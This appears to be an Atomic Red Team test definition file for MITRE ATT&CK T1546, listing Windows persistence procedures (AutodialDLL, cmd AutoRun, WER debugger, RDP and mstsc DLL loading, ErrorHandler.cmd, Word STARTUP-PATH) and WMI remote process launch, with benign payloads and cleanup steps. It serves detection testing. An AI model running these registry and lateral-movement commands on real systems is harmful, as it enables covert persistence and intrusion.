{
  "attack_technique": "T1546",
  "display_name": "Event Triggered Execution",
  "atomic_tests": [
    {
      "name": "Persistence with Custom AutodialDLL",
      "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll",
        "procedure": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll",
          "prereq_command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { exit 0} else { exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\""
        }
      ],
      "auto_generated_guid": "aca9ae16-7425-4b6d-8c30-cad306fdbd5b"
    },
    {
      "name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)",
      "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
        "procedure": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\""
      },
      "input_arguments": [
        {
          "arg_name": "command",
          "description": "Command to Execute",
          "type": "string",
          "default": "notepad.exe"
        }
      ],
      "auto_generated_guid": "a574dafe-a903-4cce-9701-14040f4f3532"
    },
    {
      "name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)",
      "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
        "procedure": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\""
      },
      "input_arguments": [
        {
          "arg_name": "command",
          "description": "Command to Execute",
          "type": "string",
          "default": "notepad.exe"
        }
      ],
      "auto_generated_guid": "36b8dbf9-59b1-4e9b-a3bb-36e80563ef01"
    },
    {
      "name": "WMI Invoke-CimMethod Start Process",
      "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession"
      },
      "input_arguments": [
        {
          "arg_name": "dest",
          "description": "destination computer name",
          "type": "string",
          "default": "localhost"
        },
        {
          "arg_name": "password",
          "description": "password for account",
          "type": "string",
          "default": "P@ssword1"
        },
        {
          "arg_name": "username",
          "description": "account to use",
          "type": "string",
          "default": "Administrator"
        },
        {
          "arg_name": "process",
          "description": "process to spawn",
          "type": "string",
          "default": "calc.exe"
        }
      ],
      "auto_generated_guid": "adae83d3-0df6-45e7-b2c3-575f91584577"
    },
    {
      "name": "Adding custom debugger for Windows Error Reporting",
      "description": "When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry.\nAdding executable of choice will let the executable to auto-execute when during any application crash due to functioning of WER framework",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /f",
        "procedure": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "17d1a3cc-3373-495a-857a-e5dd005fb302"
    },
    {
      "name": "Load custom DLL on mstsc execution",
      "description": "Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\" /v ClxDllPath /f",
        "procedure": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\" /v ClxDllPath /t REG_SZ /d \"#{dll_inf}\" /f"
      },
      "input_arguments": [
        {
          "arg_name": "dll_inf",
          "description": "custom DLL to be executed",
          "type": "Path",
          "default": "C:\\Windows\\System32\\amsi.dll"
        }
      ],
      "auto_generated_guid": "2db7852e-5a32-4ec7-937f-f4e027881700"
    },
    {
      "name": "Persistence using automatic execution of custom DLL during RDP session",
      "description": "When remote desktop session is accepted, the system queries the key it queries the Registry key:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin. \nIf such key exists, the OS will attempt to read the Path value underneath.Once the Path is read, the DLL that it points to will be loaded via LoadLibrary.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /f",
        "procedure": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /v Path /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "b7fc4c3f-fe6e-479a-ba27-ef91b88536e3"
    },
    {
      "name": "Persistence via ErrorHandler.cmd script execution",
      "description": "Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.\nUpon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-Item C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd",
        "procedure": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "ErrorHandler.cmd script must exist on disk at specified at PathToAtomicsFolder\\T1546\\bin\\ErrorHandler.cmd",
          "prereq_command": "if (Test-Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd) { exit 0} else { exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\src\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/src/ErrorHandler.cmd\" -OutFile \"PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd\""
        }
      ],
      "auto_generated_guid": "547a4736-dd1c-4b48-b4fe-e916190bb2e7"
    },
    {
      "name": "Persistence using STARTUP-PATH in MS-WORD",
      "description": "When Word starts, it searches for the registry key HKCU\\Software\\Microsoft\\Office\\<version>\\Word\\Options\\STARTUP-PATH and if it exists,\nit will treat it as a user specific start-up folder and load the contents of the folder with file extensions of .wll,.lnk,.dotm,.dot,.dotx\nThe registry key can be abused to load malware from the mentioned path. Reboot might be required.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options /v STARTUP-PATH /f",
        "procedure": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "f0027655-25ef-47b0-acaf-3d83d106156c"
    }
  ]
}